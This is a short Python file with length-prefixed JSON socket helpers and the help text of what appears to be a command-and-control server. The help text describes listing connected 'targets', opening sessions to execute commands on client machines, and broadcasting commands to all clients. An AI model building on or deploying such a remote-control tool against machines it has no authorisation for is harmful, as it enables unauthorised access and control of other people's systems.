import json
import struct
def send_frame(target,data):
    prefix = struct.pack(">I", len(data))
    target.send(prefix)
    target.send(data)

def receive_frame(target):
    prefix = b""
    prefix_len = 4
    while len(prefix) < prefix_len:
        prefix += target.recv(prefix_len-len(prefix))
    frame = b""
    frame_len = struct.unpack(">I", prefix)[0]
    while len(frame) < frame_len:
        frame += target.recv(min(1024,frame_len-len(frame)))
    return json.loads(frame.decode("utf-8"))


def reliable_send(target,data):
    json_data = json.dumps(data).encode("utf-8")
    send_frame(target,json_data)

help_message = '''
targets: List all connections to the server
session [n]:    Connect to a session. Once connected the you can esecute commands on the client machine. 
                Send "q" to return to control center without stopping the connection. Send "close" to disconnect the client.
sendall [command]: Send a command to all the connected clients
close: Turn off the server and close all connections
help: Show this message

'''